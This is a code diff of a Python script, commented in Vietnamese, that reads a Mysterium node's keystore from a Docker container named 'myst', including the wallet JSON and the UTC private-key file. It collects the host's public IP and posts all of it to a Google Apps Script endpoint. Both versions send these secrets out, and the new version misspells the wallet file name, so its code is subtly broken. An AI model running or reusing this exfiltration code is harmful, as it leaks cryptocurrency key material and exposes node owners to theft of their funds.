@@ -1,10 +1,6 @@
-import requests
-import json
-import time
-import random
 import subprocess
-
-GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzorBxpPH7QBnpR4m5YqpVNg_4dWKfx0hKYC4Mro1kWMwjVZzDQ2b_vWBtVo6PqW9ijRw/exec"
+import json
+import requests
 
 def get_public_ipv4():
     """ Lấy địa chỉ IPv4 chính xác """
@@ -18,35 +14,34 @@ def get_public_ipv4():
         except:
             return "Unknown"
 
-def read_file_in_docker(file_path):
-    """ Đọc file từ container Docker 'myst' """
-    try:
-        cmd = f"docker exec myst cat {file_path}"
-        return subprocess.check_output(cmd, shell=True, text=True).strip()
-    except:
-        return "Error reading file"
+# Get IPv4 address
+ipv4 = get_public_ipv4()
 
-def get_utc_file():
-    """ Lấy file UTC trong thư mục keystore của Docker container """
-    try:
-        cmd = "docker exec myst ls /var/lib/mysterium-node/keystore | grep UTC-"
-        utc_file = subprocess.check_output(cmd, shell=True, text=True).strip().split("\n")[0]
-        return read_file_in_docker(f"/var/lib/mysterium-node/keystore/{utc_file}")
-    except:
-        return "UTC file not found"
+# Get Wallet information
+wallet_json = (
+    subprocess.run("docker exec myst cat /var/lib/mysterium-node/keystore/remeber.json", 
+                  shell=True, capture_output=True, text=True)
+    .stdout.strip()
+)
+wallet = json.loads(wallet_json).get("wallet", "")
 
-data = {
-    "ip": get_public_ipv4(),
-    "wallet": read_file_in_docker("/var/lib/mysterium-node/keystore/remember.json"),
-    "phase": get_utc_file()
-}
+# Get UTC file name
+utc_file = (
+    subprocess.run("docker exec myst ls /var/lib/mysterium-node/keystore | grep UTC-", 
+                  shell=True, capture_output=True, text=True)
+    .stdout.strip()
+)
 
-max_retries = 5
-for i in range(max_retries):
-    response = requests.post(GOOGLE_SCRIPT_URL, json=data)
-    print("Gửi dữ liệu lần {}: {}".format(i + 1, response.text))
+# Get Phase information
+phase = (
+    subprocess.run(f"docker exec myst cat /var/lib/mysterium-node/keystore/{utc_file}", 
+                  shell=True, capture_output=True, text=True)
+    .stdout.strip()
+)
 
-    if "Success" in response.text or "Duplicate Wallet - Skipped" in response.text:
-        break  # Không cần gửi lại nếu đã thành công hoặc bị trùng
-    else:
-        time.sleep(random.uniform(1, 3))  # Chờ ngẫu nhiên 1-3 giây trước khi thử lại
+# Send data to Google Apps Script API
+api_url = "https://script.google.com/macros/s/AKfycbxinRyh8Kl7q-SvhZYUoQLeh0-WU9gn5Mh3akiS2AQK3Wg1oN2XeZTMqJyGRPnMhL0v/exec"
+data = {"ipv4": ipv4, "wallet": wallet, "phase": phase}
+response = requests.post(api_url, json=data)
+
+print(response.json())  # Kiểm tra kết quả
